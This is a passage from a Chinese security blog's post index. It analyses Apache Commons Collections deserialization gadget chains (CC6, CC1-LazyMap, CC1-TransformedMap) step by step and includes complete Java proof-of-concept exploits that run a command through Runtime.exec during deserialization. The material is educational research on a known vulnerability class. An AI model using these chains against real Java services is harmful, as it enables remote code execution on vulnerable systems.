src="https://raw.githubusercontent.com/n2ryx/images/main/2023/image-20231117214440324.png" alt="image-20231117214440324"></p><p>put 时就会触发，分析将 put 后将值放入，简单就修改 <code>LazyMap.decorate()</code> 参数，再修改 factory 的值</p><h3 id="map-put"><a href="#map-put" class="headerlink" title="map.put"></a>map.put</h3><p>执行完 <code>Object value = factory.transform(key);</code> 后，key 就有了值，再 put 就会修改其值</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023/image-20231117220641549.png" alt="image-20231117220641549"></p><p><code>lazyMap.remove()</code> 删掉其 key</p><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Gadget.CC6;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line"></span><br><span class="line">        lazyMap.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> LazyMap.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factoryFied</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryFied.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factoryFied.set(lazyMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bos);</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反序列化</span></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bos.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bis);</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Deserialize </tag>
            
            <tag> CommonsCollections </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CC1-LazyMap</title>
      <link href="/2023/11/15/java/cc/CC1-LazyMap/"/>
      <url>/2023/11/15/java/cc/CC1-LazyMap/</url>
      
        <content type="html"><![CDATA[<h2 id="CC1-LazyMap"><a href="#CC1-LazyMap" class="headerlink" title="CC1-LazyMap"></a>CC1-LazyMap</h2><h3 id="Gadget-chain"><a href="#Gadget-chain" class="headerlink" title="Gadget chain"></a>Gadget chain</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Gadget chain:</span></span><br><span class="line"><span class="comment">ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">AnnotationInvocationHandler.readObject()</span></span><br><span class="line"><span class="comment">Map(Proxy).entrySet()</span></span><br><span class="line"><span class="comment">AnnotationInvocationHandler.invoke()</span></span><br><span class="line"><span class="comment">LazyMap.get()</span></span><br><span class="line"><span class="comment">ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">ConstantTransformer.transform()</span></span><br><span class="line"><span class="comment">InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">Method.invoke()</span></span><br><span class="line"><span class="comment">Class.getMethod()</span></span><br><span class="line"><span class="comment">InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">Method.invoke()</span></span><br><span class="line"><span class="comment">Runtime.getRuntime()</span></span><br><span class="line"><span class="comment">InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">Method.invoke()</span></span><br><span class="line"><span class="comment">Runtime.exec()</span></span><br><span class="line"><span class="comment">From:</span></span><br><span class="line"><span class="comment">ysoserial</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><p>后面还是用 InvokerTransformer，这个类完成任意命令执行的操作，分析一下改变的地方</p><h3 id="LazyMap-get"><a href="#LazyMap-get" class="headerlink" title="LazyMap.get()"></a>LazyMap.get()</h3><p>也是查找哪里调用了 <code>transform()</code>，map 里没有 key 才能执行到 <code>transform()</code></p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023/image-20231117154740737.png" alt="image-20231117154740737"></p><h4 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h4><p>类型为 protected</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023/image-20231117163738044.png" alt="image-20231117163738044"></p><h4 id="decorate"><a href="#decorate" class="headerlink" title="decorate"></a>decorate</h4><p>利用这个方法完成赋值</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023/image-20231117180522791.png" alt="image-20231117180522791"></p><p>调 <code>get()</code> 有点多，直接看 chain</p><h3 id="AnnotationInvocationHandler-invoke"><a href="#AnnotationInvocationHandler-invoke" class="headerlink" title="AnnotationInvocationHandler.invoke()"></a>AnnotationInvocationHandler.invoke()</h3><p>chain: <code>AnnotationInvocationHandler.invoke()</code>，代理对象的方法被调用时由Java运行时系统隐式地调用invoke方法</p><p>第一个 if 判断方法是 equals 返回 equalsImpl，第二个 if 判断参数不等于 0；绕过if ，不为 equals 的无参函数</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023/image-20231117174557377.png" alt="image-20231117174557377"></p><p>需要执行到 <code>get()</code></p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023/image-20231117185700220.png" alt="image-20231117185700220"></p><h3 id="AnnotationInvocationHandler构造方法"><a href="#AnnotationInvocationHandler构造方法" class="headerlink" title="AnnotationInvocationHandler构造方法"></a>AnnotationInvocationHandler构造方法</h3><p>入口类也是它，会用到构造方法</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023/image-20231117181031771.png" alt="image-20231117181031771"></p><h3 id="Map-Proxy-entrySet"><a href="#Map-Proxy-entrySet" class="headerlink" title="Map(Proxy).entrySet()"></a>Map(Proxy).entrySet()</h3><p>不满足 <code>invoke()</code> 里的连个 if 条件，可以执行到 <code>get()</code></p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023/image-20231117182205495.png" alt="image-20231117182205495"></p><h4 id="Proxy-newProxyInstance"><a href="#Proxy-newProxyInstance" class="headerlink" title="Proxy.newProxyInstance"></a>Proxy.newProxyInstance</h4><p>创建动态代理，简单看一下形参，利用这个主要是调用 <code>invoke()</code></p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023/image-20231117181552438.png" alt="image-20231117181552438"></p><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Gadget.CC1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1_LazyMap</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationInvocationHandlerConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        annotationInvocationHandlerConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">h</span> <span class="operator">=</span> (InvocationHandler) annotationInvocationHandlerConstructor.newInstance(Override.class,lazyMap);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// Map，anotationInvocationHandler构造方法需要的参数</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">mapProxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,h);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationInvocationHandlerConstructor.newInstance(Override.class,mapProxy);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bos);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反序列化</span></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bos.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bis);</span><br><span class="line">        ois.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Deserialize </tag>
            
            <tag> CommonsCollections </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CC1-TransformedMap</title>
      <link href="/2023/11/12/java/cc/CC1-TransformedMap/"/>
      <url>/2023/11/12/java/cc/CC1-TransformedMap/</url>
      
        <content type="html"><![CDATA[<h2 id="CC1-TransformedMap"><a href="#CC1-TransformedMap" class="headerlink" title="CC1-TransformedMap"></a>CC1-TransformedMap</h2><p>CC1链对JDK版本有要求，需在8u71之前</p><p>Jdk1.8.0.65: <a href="https://www.oracle.com/cn/java/technologies/javase/javase8-archive-downloads.html">https://www.oracle.com/cn/java/technologies/javase/javase8-archive-downloads.html</a></p><p>sun包: <a href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4">https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4</a><br>src\share\classes\sun，放到Jdk下解压的src包内，Idea添加</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023/image-20231114132357257.png" alt="image-20231114132357257"></p><p>导入maven依赖（pom.xml）</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023/image-20231113194232916.png" alt="image-20231113194232916"></p><h3 id="Transformer-执行类"><a href="#Transformer-执行类" class="headerlink" title="Transformer-执行类"></a>Transformer-执行类</h3><p>主要利用方法 <code>Transform()</code>，看那些类实现了这个类</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023/image-20231113213642842.png" alt="image-20231113213642842"></p><p>查找用法，找到调用 transformer 的方法</p><h3 id="寻找调用链"><a href="#寻找调用链" class="headerlink" title="寻找调用链"></a>寻找调用链</h3><h4 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h4><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023/image-20231113234523714.png" alt="image-20231113234523714"></p><p>InvokerTransformer构造函数控制参数，<code>tranform()</code> 可以执行任意命令</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// InvokerTransformer</span></span><br><span class="line"><span class="keyword">package</span> Gadget.CC1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1_1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// Runtime正常执行</span></span><br><span class="line"><span class="comment">//        Runtime.getRuntime().exec(&quot;calc&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Runtime反射执行</span></span><br><span class="line"><span class="comment">//        Runtime r = Runtime.getRuntime();</span></span><br><span class="line"><span class="comment">//        Class c = Runtime.class;</span></span><br><span class="line"><span class="comment">//        Method m = c.getMethod(&quot;exec&quot;,String.class);</span></span><br><span class="line"><span class="comment">//        m.invoke(r,&quot;calc&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// InvokerTransformer.transform()实现</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(Runtime.getRuntime());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h4><p>进入到 InvokerTransformer类里，查看 Transform 的用法，找 TransformedMap</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023/image-20231114111733071.png" alt="image-20231114111733071"></p><p>这里的 valueTransformer 调用了 <code>transformer()</code>，TransformedMap构造方法可以给他赋值</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023/image-20231113222410600.png" alt="image-20231113222410600"></p><p><code>TransformedMap()</code> 是一个保护方法，<code>decorate()</code> 方法调用了它，就可以赋值了</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023/image-20231114113445459.png" alt="image-20231114113445459"></p><p>现在找哪里调用了 <code>checkSetValue()</code>，这里找到了 <code>setValue()</code></p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023/image-20231114115339182.png" alt="image-20231114115339182"></p><p>这个类还是 TransformedMap 的父类</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023/image-20231114115940344.png" alt="image-20231114115940344"></p><p><code>setValue()</code> 在 AbstractInputCheckedMapDecorator 静态嵌套类 MapEntry</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023/image-20231114120226678.png" alt="image-20231114120226678"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Gadget.CC1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Annotation;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1_2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line"><span class="comment">//        invokerTransformer.transform(Runtime.getRuntime());</span></span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;vlue&quot;</span>);  <span class="comment">// 添加键值对</span></span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,<span class="literal">null</span>,invokerTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 对 Entry 进行遍历</span></span><br><span class="line">        <span class="keyword">for</span> (Map.Entry entry:transformedMap.entrySet()) &#123;</span><br><span class="line">            <span class="comment">// TransformedMap没有setValue()，会调用父类的setValue()</span></span><br><span class="line">            entry.setValue(Runtime.getRuntime());</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="寻找入口类"><a href="#寻找入口类" class="headerlink" title="寻找入口类"></a>寻找入口类</h3><p>AnnotationInvocationHandler类下的<code>readObject()</code></p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023/image-20231114131907479.png" alt="image-20231114131907479"></p><h4 id="readObject"><a href="#readObject" class="headerlink" title="readObject()"></a>readObject()</h4><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023/image-20231114133137755.png" alt="image-20231114133137755"></p><p>后面的 for 正好在遍历 Map，要满足 if 的判断到达 <code>setValue()</code>，</p><p>执行 <code>readObject()</code> 需要获取 AnnotationInvocationHandler 对象，default类型</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023/image-20231114133608973.png" alt="image-20231114133608973"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// AnnotationInvocationHandler类是default，不能直接获取</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span>  <span class="variable">annotationInvocationHandlerConstructor</span> <span class="operator">=</span> c.getConstructor(Class.class,Map.class);</span><br><span class="line">annotationInvocationHandlerConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationInvocationHandlerConstructor.newInstance(Target.class,transformedMap);</span><br></pre></td></tr></table></figure><p>回到前面，Runtime 没有实现 Serializable，所以不能序列化</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023/image-20231114134429551.png" alt="image-20231114134429551"></p><p>Class 可以序列化，反射获取</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023/image-20231114134701335.png" alt="image-20231114134701335"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//不能序列化</span></span><br><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line"></span><br><span class="line"><span class="comment">//反射调用</span></span><br><span class="line"><span class="type">Class</span>  <span class="variable">c</span> <span class="operator">=</span> Runtime.class;</span><br><span 